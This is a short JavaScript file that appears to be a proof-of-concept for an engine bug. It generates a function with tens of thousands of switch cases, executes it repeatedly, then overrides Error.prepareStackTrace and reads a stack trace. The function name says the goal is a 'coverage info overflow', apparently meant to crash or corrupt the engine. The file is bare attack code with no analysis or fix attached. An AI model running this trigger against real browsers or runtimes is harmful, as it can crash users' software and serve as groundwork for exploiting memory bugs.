
// Create function structure to maximize basic block count
function generateNestedSwitch(depth = 5000) {
  let body = "switch(x) {";
  for (let i = 0; i < depth; i++) {
    body += `case ${i}: x += ${i}; break;`;
  }
  body += "} return x;";
  return new Function('x', body);
}
function triggerCoverageInfoOverflow() {
  const complexFn = generateNestedSwitch(0x10000);
  const obj = {
    method: complexFn
  };

  try {
    for (let i = 0; i < 10000; i++) {
      (function() {
        complexFn(i % 500);
      }).call({});
    }

    Error.prepareStackTrace = function() { return []; };
    const e = new Error();
    e.stack;
  } catch (crash) {
  }
}

triggerCoverageInfoOverflow();